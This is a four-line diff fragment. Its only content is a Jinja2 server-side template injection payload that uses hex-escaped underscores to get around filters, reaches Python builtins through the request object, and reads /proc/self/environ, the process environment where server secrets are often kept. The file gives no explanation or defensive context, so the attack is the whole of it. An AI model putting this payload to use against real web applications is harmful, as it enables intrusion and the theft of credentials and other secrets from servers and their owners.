@@ -1,0 +1,4 @@
+{{ request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("open")('/proc/self/environ', 'r')|attr('read')() }}
+
+
+
